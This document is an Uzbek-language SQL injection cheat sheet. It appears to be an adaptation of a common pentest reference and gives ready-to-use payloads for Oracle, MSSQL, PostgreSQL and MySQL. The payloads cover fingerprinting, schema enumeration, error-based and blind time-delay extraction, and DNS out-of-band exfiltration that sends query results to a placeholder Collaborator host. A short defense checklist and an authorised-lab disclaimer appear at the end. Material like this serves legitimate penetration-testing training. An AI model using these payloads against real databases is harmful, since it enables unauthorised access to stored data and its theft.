# SQL Injection Cheat Sheet (UZ + EN Terms)

Ushbu cheat sheet SQL Injection test jarayonida eng ko'p ishlatiladigan sintaksislarni tartibli ko'rinishda jamlaydi.

> Faqat ruxsat berilgan lab yoki pentest muhitida ishlating.

## 1) String Concatenation

Bir nechta string ni bitta stringga birlashtirish.

| DBMS | Misol |
|---|---|
| Oracle | `'foo'||'bar'` |
| Microsoft SQL Server | `'foo'+'bar'` |
| PostgreSQL | `'foo'||'bar'` |
| MySQL | `'foo' 'bar'` (orasida bo'sh joy) yoki `CONCAT('foo','bar')` |

## 2) Substring

String ichidan ma'lum bo'lakni olish (offset odatda 1-based).

| DBMS | Misol (`ba` qaytadi) |
|---|---|
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft SQL Server | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

## 3) Comments

Query ning qolgan qismini kesib tashlash (truncate) uchun.

| DBMS | Misol |
|---|---|
| Oracle | `--comment` |
| Microsoft SQL Server | `--comment`, `/*comment*/` |
| PostgreSQL | `--comment`, `/*comment*/` |
| MySQL | `#comment`, `-- comment` (bo'sh joy shart), `/*comment*/` |

## 4) Database Version

DB turi va versiyasini aniqlash.

| DBMS | Misol |
|---|---|
| Oracle | `SELECT banner FROM v$version` yoki `SELECT version FROM v$instance` |
| Microsoft SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

## 5) Database Contents (Tables/Columns)

Jadvallar va ustunlar ro'yxatini olish.

| DBMS | Tables | Columns |
|---|---|---|
| Oracle | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft SQL Server | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## 6) Conditional Errors

Bitta boolean shartni tekshirib, true bo'lsa xato chiqarish.

| DBMS | Misol |
|---|---|
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft SQL Server | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## 7) Error-Based Data Leak

Visible error message orqali ma'lumot sizib chiqishini tekshirish.

| DBMS | Payload | Tipik xato |
|---|---|---|
| Microsoft SQL Server | `SELECT 'foo' WHERE 1 = (SELECT 'secret')` | `Conversion failed... 'secret' ... int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` | `invalid input syntax for integer: "secret"` |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` | `XPATH syntax error: '\secret'` |

## 8) Batched / Stacked Queries

Ketma-ket bir nechta query bajarish.

| DBMS | Misol |
|---|---|
| Oracle | Stacked query qo'llab-quvvatlamaydi |
| Microsoft SQL Server | `QUERY-1-HERE; QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL | `QUERY-1-HERE; QUERY-2-HERE` (har doim ham emas) |

Eslatma: MySQL da bu usul ko'pincha ishlamaydi, lekin ayrim PHP/Python API konfiguratsiyalarida ishlashi mumkin.

## 9) Time Delay (Unconditional)

Blind SQLi holatida time-based signal olish uchun.

| DBMS | 10 soniya delay |
|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft SQL Server | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

## 10) Conditional Time Delay

Shart true bo'lsa delay chaqirish.

| DBMS | Misol |
|---|---|
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft SQL Server | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

## 11) DNS Lookup (OAST)

Tashqi domain ga DNS so'rov chiqishini tekshirish (masalan, Burp Collaborator).

### Oracle

Eski/patch qilinmagan XXE holatlari:

```sql
SELECT EXTRACTVALUE(
	xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),
	'/l'
) FROM dual
```

Patch qilingan tizimda (elevated privileges kerak bo'lishi mumkin):

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

### Microsoft SQL Server

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

### PostgreSQL

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

### MySQL (Windows only)

```sql
LOAD_FILE('\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

## 12) DNS Lookup + Data Exfiltration

DNS subdomain ichiga query natijasini joylab exfiltration qilish.

### Oracle

```sql
SELECT EXTRACTVALUE(
	xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),
	'/l'
) FROM dual
```

### Microsoft SQL Server

```sql
declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

### PostgreSQL

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
	SELECT into p (SELECT YOUR-QUERY-HERE);
	c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
	execute c;
END;
$$ language plpgsql security definer;

SELECT f();
```

### MySQL (Windows only)

```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

---

## Quick Workflow (Praktik tartib)

1. Input context ni aniqlang (`'`, `"`, numeric, `ORDER BY`, `UNION`).
2. DBMS fingerprint qiling (error, version, syntax farqlari).
3. Injection turini aniqlang: Error-based, Union-based, Blind (Boolean/Time).
4. Minimal payload bilan tasdiqlang.
5. Data extraction ni bosqichma-bosqich qiling.
6. Har bosqichni log qilib boring (reproducible notes).

## Defense Checklist (Qo'shimcha, muhim)

- Prepared Statements (parameterized query) ishlating.
- Dynamic query string concatenation dan qoching.
- DB account ga minimal privilege bering (least privilege).
- Verbose DB errorlarni foydalanuvchiga ko'rsatmang.
- WAF qo'llang, lekin uni asosiy himoya deb hisoblamang.
- Input validation + output encoding ni birga qo'llang.
- SAST/DAST va code review jarayonini majburiy qiling.
